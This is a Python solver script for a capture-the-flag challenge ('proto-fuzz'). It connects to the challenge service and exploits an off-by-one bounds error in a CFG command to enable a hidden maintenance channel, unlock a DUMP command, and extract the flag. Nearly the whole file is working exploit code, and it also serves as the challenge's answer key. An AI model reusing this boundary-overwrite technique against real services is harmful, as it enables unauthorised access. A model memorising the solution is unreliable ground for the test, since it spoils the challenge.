#!/usr/bin/env python3
"""Reference solver for proto-fuzz (FZLP/1).

Exploits the CFG length off-by-one: CFG reads n+1 entry lines and writes channel
index i for i in range(n+1) with no bound check against the documented channel
count. At the boundary n == 3 (the documented maximum), the extra write lands on
channel index 3 -- the undocumented "maintenance" channel. Writing it non-zero
arms maintenance, which unlocks the hidden DUMP command; DUMP then returns the
per-team flag.

Usage:
    python3 solve.py <host> <port>
    python3 solve.py               # defaults to localhost 9109
"""
import re
import socket
import sys
import time


def recv_until_quiet(sock, quiet=0.4, hard=4.0):
    sock.settimeout(quiet)
    buf = b""
    start = time.time()
    while time.time() - start < hard:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
        except socket.timeout:
            break
    return buf.decode("utf-8", "replace")


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9109

    s = socket.create_connection((host, port), timeout=10)
    banner = recv_until_quiet(s, quiet=0.5)
    print("[banner]", banner.strip())

    # The exploit:
    #   CFG 3            -- n == documented max; loop iterates i = 0,1,2,3
    #   01               -- entry 0 -> channel 0
    #   01               -- entry 1 -> channel 1
    #   01               -- entry 2 -> channel 2
    #   01               -- entry 3 -> channel 3 (MAINTENANCE, off-by-one)  <-- nonzero!
    payload = "CFG 3\r\n01\r\n01\r\n01\r\n01\r\n"
    print("[send] arming maintenance via CFG length off-by-one")
    s.sendall(payload.encode())
    print("[recv]", recv_until_quiet(s).strip())

    # DUMP is now unlocked; it verifies the effect server-side and emits the flag.
    print("[send] DUMP")
    s.sendall(b"DUMP\r\n")
    out = recv_until_quiet(s)
    print("[recv]", out.strip())

    m = re.search(r"CTF\{[^}]+\}", out)
    if m:
        print("\n[+] FLAG:", m.group(0))
    else:
        print("\n[-] no flag found; is the service reachable and armed?")
        sys.exit(1)
    s.close()


if __name__ == "__main__":
    main()
